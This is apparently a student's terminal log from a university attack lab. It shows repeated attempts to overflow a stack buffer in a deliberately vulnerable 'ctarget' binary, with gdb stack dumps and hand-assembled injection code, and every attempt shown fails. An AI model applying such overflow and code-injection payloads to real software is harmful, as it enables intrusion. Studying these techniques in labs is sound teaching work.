+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt > ans2.txt
+[huimin@lnxsrv09 ~/target17]$ ./ctarget -q < ans2.txt
+Cookie: 0x76ebdb56
+Type string:Misfire: You called touch2(0x2fb52640)
+FAIL: Would have posted the following:
+	user id	704978214
+	course	CS33-S16
+	lab	attacklab
+	result	17:FAIL:0xffffffff:ctarget:2:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 56 DB EB 76 00 8A 18 40 
+[huimin@lnxsrv09 ~/target17]$ gdb ctarget
+GNU gdb (GDB) 8.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-pc-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ctarget...done.
+(gdb) disas getbuf
+Dump of assembler code for function getbuf:
+   0x0000000000401848 <+0>:	sub    $0x38,%rsp
+   0x000000000040184c <+4>:	mov    %rsp,%rdi
+   0x000000000040184f <+7>:	callq  0x401a8a <Gets>
+   0x0000000000401854 <+12>:	mov    $0x1,%eax
+   0x0000000000401859 <+17>:	add    $0x38,%rsp
+   0x000000000040185d <+21>:	retq   
+End of assembler dump.
+(gdb) break *0x0000000000401859
+Breakpoint 1 at 0x401859: file buf.c, line 16.
+(gdb) run < ans2.txt
+Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < ans2.txt
+Cookie: 0x76ebdb56
+
+Breakpoint 1, 0x0000000000401859 in getbuf () at buf.c:16
+16	buf.c: No such file or directory.
+(gdb) x/128bx $rsp
+0x5561a088:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a090:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a098:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0a0:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0a8:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0b0:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0b8:	0x30	0x30	0x30	0x56	0xdb	0xeb	0x76	0x00
+0x5561a0c0:	0x8a	0x18	0x40	0x00	0x00	0x00	0x00	0x00
+0x5561a0c8:	0x09	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0d0:	0xe3	0x1e	0x40	0x00	0x00	0x00	0x00	0x00
+0x5561a0d8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0e0:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
+0x5561a0e8:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
+0x5561a0f0:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
+0x5561a0f8:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
+0x5561a100:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
+(gdb) quit
+A debugging session is active.
+
+	Inferior 1 [process 4057] will be killed.
+
+Quit anyway? (y or n) y
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt > ans2.txt
+[huimin@lnxsrv09 ~/target17]$ ./ctarget -q < ans2.txt
+Cookie: 0x76ebdb56
+Type string:Ouch!: You caused a segmentation fault!
+Better luck next time
+FAIL: Would have posted the following:
+	user id	704978214
+	course	CS33-S16
+	lab	attacklab
+	result	17:FAIL:0xffffffff:ctarget:0:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 56 DB EB 76 00 8A 18 40 
+[huimin@lnxsrv09 ~/target17]$ gdb ctarget
+GNU gdb (GDB) 8.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-pc-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ctarget...done.
+(gdb) break *30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 56 db eb 76 00 8a 18 40 
+A syntax error in expression, near `30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 56 db eb 76 00 8a 18 40'.
+(gdb) break *0x0000000000401859
+Breakpoint 1 at 0x401859: file buf.c, line 16.
+(gdb) run < ans2.txt
+Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < ans2.txt
+Cookie: 0x76ebdb56
+
+Breakpoint 1, 0x0000000000401859 in getbuf () at buf.c:16
+16	buf.c: No such file or directory.
+(gdb) x/128bx $rsp
+0x5561a088:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a090:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a098:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0a0:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0a8:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0b0:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0b8:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0c0:	0x56	0xdb	0xeb	0x76	0x00	0x8a	0x18	0x40
+0x5561a0c8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0d0:	0xe3	0x1e	0x40	0x00	0x00	0x00	0x00	0x00
+0x5561a0d8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0e0:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
+0x5561a0e8:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
+0x5561a0f0:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
+0x5561a0f8:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
+0x5561a100:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
+(gdb) quit
+A debugging session is active.
+
+	Inferior 1 [process 4646] will be killed.
+
+Quit anyway? (y or n) y
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ ./ctarget -q < ans2.txt
+Cookie: 0x76ebdb56
+Type string:Ouch!: You caused a segmentation fault!
+Better luck next time
+FAIL: Would have posted the following:
+	user id	704978214
+	course	CS33-S16
+	lab	attacklab
+	result	17:FAIL:0xffffffff:ctarget:0:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 56 DB EB 76 00 8A 18 40 
+[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt > ans2.txt
+[huimin@lnxsrv09 ~/target17]$ ./ctarget -q < ans2.txt
+Cookie: 0x76ebdb56
+Type string:Ouch!: You caused a segmentation fault!
+Better luck next time
+FAIL: Would have posted the following:
+	user id	704978214
+	course	CS33-S16
+	lab	attacklab
+	result	17:FAIL:0xffffffff:ctarget:0:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 56 DB EB 76 00 00 00 00 8A 18 40 
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt > ans2.txt
+[huimin@lnxsrv09 ~/target17]$ ./ctarget -q < ans2.txt
+Cookie: 0x76ebdb56
+Type string:Ouch!: You caused a segmentation fault!
+Better luck next time
+FAIL: Would have posted the following:
+	user id	704978214
+	course	CS33-S16
+	lab	attacklab
+	result	17:FAIL:0xffffffff:ctarget:0:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 56 DB EB 76 00 00 00 00 00 00 00 00 00 00 00 00 8A 18 40 
+[huimin@lnxsrv09 ~/target17]$ gdb ctarget
+GNU gdb (GDB) 8.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-pc-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ctarget...done.
+(gdb) break *0x401859
+Breakpoint 1 at 0x401859: file buf.c, line 16.
+(gdb) run < ans2.txt
+Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < ans2.txt
+Cookie: 0x76ebdb56
+
+Breakpoint 1, 0x0000000000401859 in getbuf () at buf.c:16
+16	buf.c: No such file or directory.
+(gdb) x/128bx $rsp
+0x5561a088:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a090:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a098:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0a0:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0a8:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0b0:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0b8:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0c0:	0x56	0xdb	0xeb	0x76	0x00	0x00	0x00	0x00
+0x5561a0c8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0d0:	0x8a	0x18	0x40	0x00	0x00	0x00	0x00	0x00
+0x5561a0d8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0e0:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
+0x5561a0e8:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
+0x5561a0f0:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
+0x5561a0f8:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
+0x5561a100:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
+(gdb) info registers
+rax            0x1	1
+rbx            0x55586000	1431855104
+rcx            0xdf	223
+rdx            0xa	10
+rsi            0x7ffff7dd6a10	140737351870992
+rdi            0x7ffff7dd5640	140737351865920
+rbp            0x55685fe8	0x55685fe8
+rsp            0x5561a088	0x5561a088
+r8             0x7ffff7fce740	140737353934656
+r9             0x0	0
+r10            0x22	34
+r11            0x246	582
+r12            0x1	1
+r13            0x0	0
+r14            0x0	0
+r15            0x0	0
+rip            0x401859	0x401859 <getbuf+17>
+eflags         0x246	[ PF ZF IF ]
+cs             0x33	51
+ss             0x2b	43
+ds             0x0	0
+es             0x0	0
+fs             0x0	0
+gs             0x0	0
+(gdb) quit
+A debugging session is active.
+
+	Inferior 1 [process 4959] will be killed.
+
+Quit anyway? (y or n) y
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt > ans2.txt
+[huimin@lnxsrv09 ~/target17]$ ./ctarget -q < ans2.txt
+Cookie: 0x76ebdb56
+Type string:Misfire: You called touch2(0xd8be7640)
+FAIL: Would have posted the following:
+	user id	704978214
+	course	CS33-S16
+	lab	attacklab
+	result	17:FAIL:0xffffffff:ctarget:2:56 DB EB 76 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 8A 18 40 
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt > ans2.txt
+[huimin@lnxsrv09 ~/target17]$ ./ctarget -q < ans2.txt
+Cookie: 0x76ebdb56
+Type string:Misfire: You called touch2(0x8985b640)
+FAIL: Would have posted the following:
+	user id	704978214
+	course	CS33-S16
+	lab	attacklab
+	result	17:FAIL:0xffffffff:ctarget:2:BF 56 DB EB 76 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 8A 18 40 
+[huimin@lnxsrv09 ~/target17]$ gdb ctarget
+GNU gdb (GDB) 8.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-pc-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ctarget...done.
+(gdb) break *401859
+Breakpoint 1 at 0x621c3
+(gdb) delete 1
+(gdb) break *0x401859
+Breakpoint 2 at 0x401859: file buf.c, line 16.
+(gdb) run < ans2.txt
+Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < ans2.txt
+Cookie: 0x76ebdb56
+
+Breakpoint 2, 0x0000000000401859 in getbuf () at buf.c:16
+16	buf.c: No such file or directory.
+(gdb) x/64bx $rsp
+0x5561a088:	0xbf	0x56	0xdb	0xeb	0x76	0x00	0x00	0x00
+0x5561a090:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a098:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0a0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0a8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0b0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0b8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0c0:	0x8a	0x18	0x40	0x00	0x00	0x00	0x00	0x00
+(gdb) info registers
+rax            0x1	1
+rbx            0x55586000	1431855104
+rcx            0xaf	175
+rdx            0xa	10
+rsi            0x7ffff7dd6a10	140737351870992
+rdi            0x7ffff7dd5640	140737351865920
+rbp            0x55685fe8	0x55685fe8
+rsp            0x5561a088	0x5561a088
+r8             0x7ffff7fce740	140737353934656
+r9             0x0	0
+r10            0x22	34
+r11            0x246	582
+r12            0x1	1
+r13            0x0	0
+r14            0x0	0
+r15            0x0	0
+rip            0x401859	0x401859 <getbuf+17>
+eflags         0x246	[ PF ZF IF ]
+cs             0x33	51
+ss             0x2b	43
+ds             0x0	0
+es             0x0	0
+fs             0x0	0
+gs             0x0	0
+(gdb) break touch2
+Breakpoint 3 at 0x40188a: file visible.c, line 40.
+(gdb) continue
+Continuing.
+
+Breakpoint 3, touch2 (val=4158477888) at visible.c:40
+40	visible.c: No such file or directory.
+(gdb) print $rdi
+$1 = 140737351865920
+(gdb) x/8bx 0x7ffff7dd5640
+0x7ffff7dd5640 <_IO_2_1_stdin_>:	0x88	0x20	0xad	0xfb	0x00	0x00	0x00	0x00
+(gdb) x/64bx 0x7ffff7dd5640
+0x7ffff7dd5640 <_IO_2_1_stdin_>:	0x88	0x20	0xad	0xfb	0x00	0x00	0x00	0x00
+0x7ffff7dd5648 <_IO_2_1_stdin_+8>:	0x3c	0x60	0xff	0xf7	0xff	0x7f	0x00	0x00
+0x7ffff7dd5650 <_IO_2_1_stdin_+16>:	0x3c	0x60	0xff	0xf7	0xff	0x7f	0x00	0x00
+0x7ffff7dd5658 <_IO_2_1_stdin_+24>:	0x00	0x60	0xff	0xf7	0xff	0x7f	0x00	0x00
+0x7ffff7dd5660 <_IO_2_1_stdin_+32>:	0x00	0x60	0xff	0xf7	0xff	0x7f	0x00	0x00
+0x7ffff7dd5668 <_IO_2_1_stdin_+40>:	0x00	0x60	0xff	0xf7	0xff	0x7f	0x00	0x00
+0x7ffff7dd5670 <_IO_2_1_stdin_+48>:	0x00	0x60	0xff	0xf7	0xff	0x7f	0x00	0x00
+0x7ffff7dd5678 <_IO_2_1_stdin_+56>:	0x00	0x60	0xff	0xf7	0xff	0x7f	0x00	0x00
+(gdb) x/64bx 0x7ffff7dd5600
+0x7ffff7dd5600 <_IO_wide_data_1+288>:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x7ffff7dd5608 <_IO_wide_data_1+296>:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x7ffff7dd5610 <_IO_wide_data_1+304>:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x7ffff7dd5618 <_IO_wide_data_1+312>:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x7ffff7dd5620 <_IO_wide_data_1+320>:	0xc0	0x31	0xdd	0xf7	0xff	0x7f	0x00	0x00
+0x7ffff7dd5628:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x7ffff7dd5630:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x7ffff7dd5638:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+(gdb) print 0xfbad2088
+$2 = 4222427272
+(gdb) x/bx 0x55586000
+0x55586000:	0x00
+(gdb) x/8bx 0x55586000
+0x55586000:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+(gdb) x/64bx 0x55586000
+0x55586000:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x55586008:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x55586010:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x55586018:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x55586020:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x55586028:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x55586030:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x55586038:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+(gdb) quit
+A debugging session is active.
+
+	Inferior 1 [process 8465] will be killed.
+
+Quit anyway? (y or n) y
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt > ans2.txt
+[huimin@lnxsrv09 ~/target17]$ ./ctarget -q < ans2.txt
+Cookie: 0x76ebdb56
+Type string:Misfire: You called touch2(0x02d03640)
+FAIL: Would have posted the following:
+	user id	704978214
+	course	CS33-S16
+	lab	attacklab
+	result	17:FAIL:0xffffffff:ctarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 BF 56 DB EB 76 00 00 00 8A 18 40 
+[huimin@lnxsrv09 ~/target17]$ gdb ctarget
+GNU gdb (GDB) 8.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-pc-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ctarget...done.
+(gdb) disas getbuf
+Dump of assembler code for function getbuf:
+   0x0000000000401848 <+0>:	sub    $0x38,%rsp
+   0x000000000040184c <+4>:	mov    %rsp,%rdi
+   0x000000000040184f <+7>:	callq  0x401a8a <Gets>
+   0x0000000000401854 <+12>:	mov    $0x1,%eax
+   0x0000000000401859 <+17>:	add    $0x38,%rsp
+   0x000000000040185d <+21>:	retq   
+End of assembler dump.
+(gdb) break* 0x401859
+Breakpoint 1 at 0x401859: file buf.c, line 16.
+(gdb) print $eax
+No registers.
+(gdb) run < ans2.txt
+Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < ans2.txt
+Cookie: 0x76ebdb56
+
+Breakpoint 1, 0x0000000000401859 in getbuf () at buf.c:16
+16	buf.c: No such file or directory.
+(gdb) print $eax
+$1 = 1
+(gdb) quit
+A debugging session is active.
+
+	Inferior 1 [process 9823] will be killed.
+
+Quit anyway? (y or n) y
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt > ans2.txt
+[huimin@lnxsrv09 ~/target17]$ ./ctarget -q < ans2.txt
+Cookie: 0x76ebdb56
+Type string:Misfire: You called touch2(0x52130640)
+FAIL: Would have posted the following:
+	user id	704978214
+	course	CS33-S16
+	lab	attacklab
+	result	17:FAIL:0xffffffff:ctarget:2:BF 56 DB EB 76 00 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 88 A0 61 55 00 00 00 00 8A 18 40 
+[huimin@lnxsrv09 ~/target17]$ gdb ctarget
+GNU gdb (GDB) 8.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-pc-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ctarget...done.
+(gdb) break *0x401859
+Breakpoint 1 at 0x401859: file buf.c, line 16.
+(gdb) run < ans2.txt
+Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < ans2.txt
+Cookie: 0x76ebdb56
+
+Breakpoint 1, 0x0000000000401859 in getbuf () at buf.c:16
+16	buf.c: No such file or directory.
+(gdb) x/64bx $rsp
+0x5561a088:	0xbf	0x56	0xdb	0xeb	0x76	0x00	0x00	0xc3
+0x5561a090:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a098:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0a0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0a8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0b0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0b8:	0x88	0xa0	0x61	0x55	0x00	0x00	0x00	0x00
+0x5561a0c0:	0x8a	0x18	0x40	0x00	0x00	0x00	0x00	0x00
+(gdb) info registers
+rax            0x1	1
+rbx            0x55586000	1431855104
+rcx            0xaf	175
+rdx            0xa	10
+rsi            0x7ffff7dd6a10	140737351870992
+rdi            0x7ffff7dd5640	140737351865920
+rbp            0x55685fe8	0x55685fe8
+rsp            0x5561a088	0x5561a088
+r8             0x7ffff7fce740	140737353934656
+r9             0x0	0
+r10            0x22	34
+r11            0x246	582
+r12            0x1	1
+r13            0x0	0
+r14            0x0	0
+r15            0x0	0
+rip            0x401859	0x401859 <getbuf+17>
+eflags         0x246	[ PF ZF IF ]
+cs             0x33	51
+ss             0x2b	43
+ds             0x0	0
+es             0x0	0
+fs             0x0	0
+gs             0x0	0
+(gdb) quit
+A debugging session is active.
+
+	Inferior 1 [process 10265] will be killed.
+
+Quit anyway? (y or n) y
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt > ans2.txt
+[huimin@lnxsrv09 ~/target17]$ ./ctarget -q < ans2.txt
+Cookie: 0x76ebdb56
+Type string:Misfire: You called touch2(0x9a6e0640)
+FAIL: Would have posted the following:
+	user id	704978214
+	course	CS33-S16
+	lab	attacklab
+	result	17:FAIL:0xffffffff:ctarget:2:BF 56 DB EB 76 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 88 A0 61 55 00 00 00 00 8A 18 40 
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt > ans2.txt
+[huimin@lnxsrv09 ~/target17]$ ./ctarget -q < ans2.txt
+Cookie: 0x76ebdb56
+Type string:Ouch!: You caused a segmentation fault!
+Better luck next time
+FAIL: Would have posted the following:
+	user id	704978214
+	course	CS33-S16
+	lab	attacklab
+	result	17:FAIL:0xffffffff:ctarget:0:BF 56 DB EB 76 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 88 A0 61 55 00 00 00 00 8A 18 40 
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt > ans2.txt
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt > ans2.txt
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ ./ctarget -q < ans2.txt
+Cookie: 0x76ebdb56
+Type string:Ouch!: You caused a segmentation fault!
+Better luck next time
+FAIL: Would have posted the following:
+	user id	704978214
+	course	CS33-S16
+	lab	attacklab
+	result	17:FAIL:0xffffffff:ctarget:0:BF 56 DB EB 76 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 88 A0 61 55 
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ emacs phase2.s
+[huimin@lnxsrv09 ~/target17]$ gcc -c phase.s
+gcc: error: phase.s: No such file or directory
+gcc: fatal error: no input files
+compilation terminated.
+[huimin@lnxsrv09 ~/target17]$ emacs phase2.s
+[huimin@lnxsrv09 ~/target17]$ gcc -c phase.s
+gcc: error: phase.s: No such file or directory
+gcc: fatal error: no input files
+compilation terminated.
+[huimin@lnxsrv09 ~/target17]$ gcc -c phase2.s
+phase2.s: Assembler messages:
+phase2.s:1: Error: operand type mismatch for `movq'
+[huimin@lnxsrv09 ~/target17]$ emacs phase2.s
+[huimin@lnxsrv09 ~/target17]$ gcc -c phase2.s
+[huimin@lnxsrv09 ~/target17]$ objdump -d phase2
+objdump: 'phase2': No such file
+[huimin@lnxsrv09 ~/target17]$ objdump -d phase2.s
+objdump: phase2.s: File format not recognized
+[huimin@lnxsrv09 ~/target17]$ objdump -d phase2.o
+
+phase2.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 c7 c7 56 db eb 76 	mov    $0x76ebdb56,%rdi
+   7:	c3                   	retq   
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt > ans2.txt
+[huimin@lnxsrv09 ~/target17]$ ./ctarget -q < ans2.txt
+Cookie: 0x76ebdb56
+Type string:Misfire: You called touch2(0xd1315640)
+FAIL: Would have posted the following:
+	user id	704978214
+	course	CS33-S16
+	lab	attacklab
